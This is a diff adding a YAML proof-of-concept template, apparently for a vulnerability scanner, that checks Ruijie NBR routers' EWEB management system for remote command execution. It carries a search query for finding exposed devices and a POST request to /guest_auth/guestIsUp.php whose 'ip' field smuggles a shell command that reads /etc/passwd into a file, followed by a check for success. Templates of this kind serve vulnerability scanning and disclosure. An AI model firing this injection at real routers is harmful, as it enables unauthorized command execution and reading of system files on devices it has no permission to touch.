@@ -1,0 +1,28 @@
+name: 锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞
+manual: true
+query: (app="Ruijie-EG" || title="锐捷网络-EWEB网管系统" || app="Ruijie--EWEB")
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /guest_auth/guestIsUp.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: mac=1&ip=127.0.0.1|cat /etc/passwd > PeiQi.txt
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /guest_auth/guestIsUp.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+    expression: response.status != 404 && !response.body.bcontains(b"File not found.")
+      && !response.body.bcontains(b">__<") && response.status == 200
+expression: r0() && r1()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: 锐捷NBR路由器 EWEB网管系统部分接口存在命令注入，导致远程命令执行获取权限
+  tags: 远程命令执行
